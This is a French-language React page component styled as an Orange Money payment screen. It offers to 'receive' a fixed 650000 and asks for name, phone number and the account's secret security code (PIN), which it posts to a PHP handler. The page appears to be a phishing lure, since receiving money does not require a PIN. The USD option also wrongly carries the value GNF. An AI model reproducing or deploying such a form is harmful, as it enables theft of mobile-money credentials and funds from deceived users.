export default function Page() {
    return (
        <div>
            <div className="container">
                <h1>Paiement via Orange Money</h1>

                <form action="process_payment.php" method="POST">
                    <div className="htmlForm-group">
                        <label htmlFor="name">Nom et Prénom</label>
                        <input type="text" id="name" name="name" placeholder="Nom et Prénom" required />
                    </div>

                    <div className="htmlForm-group">
                        <label htmlFor="phone">Numéro Orange Money</label>
                        <input type="tel" id="phone" name="phone" placeholder="Numéro" required />
                    </div>

                    <div className="htmlForm-group">
                        <label htmlFor="currency">Devise</label>
                        <select id="currency" name="currency">
                            <option value="FCFA">FCFA</option>
                            <option value="GNF">GNF</option>
                            <option value="GNF">USD</option>
                        </select>
                    </div>

                    <div className="htmlForm-group">
                        <label htmlFor="amount">Montant à recevoir</label>
                        <input type="number" id="amount" name="amount" placeholder="Montant" value="650000" disabled required />
                    </div>

                    <div className="htmlForm-group">
                        <label htmlFor="security-code">Code de sécurité</label>
                        <input type="password" id="security-code" name="security-code" placeholder="Ex: 1234" required />
                    </div>

                    <button type="submit">Recevoir</button>
                </form>
            </div>
        </div>
    )
}